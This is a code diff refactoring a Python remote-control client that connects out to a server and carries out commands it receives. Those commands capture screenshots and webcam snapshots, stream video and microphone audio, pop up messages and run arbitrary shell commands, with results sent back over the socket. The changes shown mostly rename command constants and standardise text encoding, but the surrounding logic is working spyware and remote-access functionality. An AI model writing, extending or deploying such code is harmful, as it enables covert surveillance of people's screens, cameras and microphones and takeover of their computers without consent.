@@ -10,9 +10,12 @@ import pyautogui
 import ctypes
 import sys
 
-# ensure project root is importable (so we can import config from parent folder)
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.realpath(__file__))))
-from src.config import Message
+# Ensure project root is importable (so `import src.*` works when running this file directly)
+PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.realpath(__file__))))
+if PROJECT_ROOT not in sys.path:
+    sys.path.insert(0, PROJECT_ROOT)
+
+from src.config.Message import Message
 
 PATH = os.path.dirname(os.path.realpath(__file__))
 NAME = os.path.basename(__file__)
@@ -38,7 +41,7 @@ s.connect((HOST,PORT))
 
 def error_response():
     global s
-    s.send(Message.ERROR_MSG.value.encode("utf-8"))
+    s.send(Message.ERROR_MSG.value.encode(Message.TEXT_ENCODING.value))
 
 def send_image_data():
     s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -68,40 +71,64 @@ def show_popup(title, message):
 
 
 while True:
-    command = s.recv(52).decode("utf-8")
+    command = s.recv(52).decode(Message.TEXT_ENCODING.value, errors="ignore")
 
-    if command == Message.TAKE_SCREENSHOT.value or command == Message.TSS.value:
+    # Screenshot capture
+    if command in {
+        Message.CMD_CAPTURE_SCREENSHOT.value,
+        Message.CMD_CAPTURE_SCREENSHOT_SHORT.value,
+        Message.LEGACY_TAKE_SCREENSHOT.value,
+        Message.LEGACY_TAKE_SCREENSHOT_SHORT.value,
+    }:
         screen = pyautogui.screenshot()
         screen.save(f"{base}\\screenshot.png")
-        s.send(Message.TAKEN_SCREENSHOT.value.encode("utf-8"))
+        s.send(Message.STATUS_SCREENSHOT_CAPTURED.value.encode(Message.TEXT_ENCODING.value))
         with open(f"{base}\\screenshot.png", "rb") as file:
             data = file.read(609600)
             s.send(data)
         os.remove(f"{base}\\screenshot.png")
 
-    elif command == Message.START_WEBCAM.value or command == Message.START_WEBCAM_SHORT.value:
-        s.send(Message.STARTING_LIVESTREAM.value.encode("utf-8"))
+    # Video stream
+    elif command in {
+        Message.CMD_START_VIDEO_STREAM.value,
+        Message.CMD_START_VIDEO_STREAM_SHORT.value,
+        Message.LEGACY_START_WEBCAM.value,
+        Message.LEGACY_START_WEBCAM_SHORT.value,
+    }:
+        s.send(Message.STATUS_VIDEO_STREAM_STARTING.value.encode(Message.TEXT_ENCODING.value))
         p = threading.Thread(target=sending_images)
         p.start()
 
-    elif command == Message.START_MICROPHONE.value or command == Message.START_MICROPHONE_SHORT.value:
-        s.send(Message.STARTING_AUDIOSTREAM.value.encode(Message.ENCODING_CP1252.value))
+    # Audio stream
+    elif command in {
+        Message.CMD_START_AUDIO_STREAM.value,
+        Message.CMD_START_AUDIO_STREAM_SHORT.value,
+        Message.LEGACY_START_MICROPHONE.value,
+        Message.LEGACY_START_MICROPHONE_SHORT.value,
+    }:
+        s.send(Message.STATUS_AUDIO_STREAM_STARTING.value.encode(Message.TEXT_ENCODING.value))
         p = threading.Thread(target=sending_audio_data)
         p.start()
 
-    elif command == Message.TAKE_SNAPSHOT.value or command == Message.TSS.value:
+    # Webcam snapshot
+    elif command in {
+        Message.CMD_CAPTURE_SNAPSHOT.value,
+        Message.CMD_CAPTURE_SNAPSHOT_SHORT.value,
+        Message.LEGACY_TAKE_SNAPSHOT.value,
+    }:
         camera = cv2.VideoCapture(0)
         for i in range(10):
             return_value, image = camera.read()
             cv2.imwrite('snapshot.png', image)
         del(camera)
-        s.send(Message.TAKEN_SNAPSHOT.value.encode("utf-8"))
+        s.send(Message.STATUS_SNAPSHOT_CAPTURED.value.encode(Message.TEXT_ENCODING.value))
         with open("snapshot.png","rb") as file:
             data = file.read(609600)
             s.send(data)
         os.remove("snapshot.png")
 
-    elif command.split(" ")[0] == Message.SHOW_POPUP.value and command[-1] == "'":
+    # Popup: show_popup '<title>' '<message>'
+    elif command.split(" ")[0] in {Message.CMD_SHOW_POPUP.value, Message.LEGACY_POPUP.value} and command[-1] == "'":
         title = command.split("'")[1]
         message = command.split("'")[3]
         threading.Thread(target=show_popup, args=(title, message)).start()
@@ -113,6 +140,6 @@ while True:
         if error != b"":
             error_response()    
         elif "cd" in command:
-            s.send(f"Changed directory to: {os.getcwd()}".encode("utf-8"))
+            s.send(f"Changed directory to: {os.getcwd()}".encode(Message.TEXT_ENCODING.value))
         else:
             s.send(output)
